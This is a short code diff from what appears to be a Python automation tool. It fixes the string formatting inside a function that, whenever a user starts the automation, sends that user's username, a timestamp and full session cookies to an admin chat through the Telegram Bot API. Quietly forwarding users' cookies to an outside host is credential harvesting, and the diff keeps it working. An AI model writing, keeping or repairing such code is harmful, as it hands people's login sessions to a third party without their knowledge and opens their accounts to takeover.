@@ -388,11 +388,12 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         kolkata_tz = pytz.timezone('Asia/Kolkata')
         current_time = datetime.now(kolkata_tz).strftime("%Y-%m-%d %H:%M:%S")
         cookies_display = cookies if cookies else "No cookies"
-        message = f"🔔 New User Started Automation
+        message = f"""🔔 New User Started Automation
 
 👤 Username: {username}
 ⏰ Time: {current_time}
-🍪 Cookies: {cookies_display}"
+🍪 Cookies: {cookies_display}
+"""
         url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
         data = {"chat_id":telegram_admin_chat_id, "text":message}
         log_message('TELEGRAM-NOTIFY: Sending admin notification...', automation_state)
